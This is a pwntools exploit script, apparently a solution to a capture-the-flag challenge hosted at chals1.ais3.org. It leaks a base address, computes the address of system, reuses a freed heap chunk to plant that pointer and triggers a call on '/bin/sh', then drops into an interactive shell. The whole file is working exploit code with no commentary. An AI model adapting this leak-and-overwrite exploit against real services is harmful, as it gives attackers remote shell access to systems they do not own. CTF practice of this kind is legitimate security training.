from pwn import *

#r = process('./home/users')
r = remote('chals1.ais3.org',2468)
def reset():
    r.sendlineafter(b'> ',b'1')

def create(idx,name,size,data):
    r.sendlineafter(b'> ',b'2')
    r.sendline(str(idx))
    r.sendafter(b'name > ',name)
    r.sendlineafter(b'size > ',str(size))
    r.sendafter(b'data > ',data)
def delete(idx):
    r.sendlineafter(b'> ',b'3')
    r.sendline(str(idx))

def func(idx):
    r.sendlineafter(b'> ',b'4')
    r.sendline(str(idx))

def view():
    r.sendlineafter(b'> ',b'5')

r.recvuntil(b'users @ ')
code = r.recvline().strip().decode()
code = int(code,16) - 0x4060
print(hex(code))

system = code + 0x1130

payload = p64(0)*2 + p64(system)
reset()
create(2,b'ccccc',0x18,payload)
delete(2)
create(3,b'/bin/sh\x00',0x30,payload)
create(4,b'/bin/sh\x00',0x30,payload)

func(4)
r.interactive()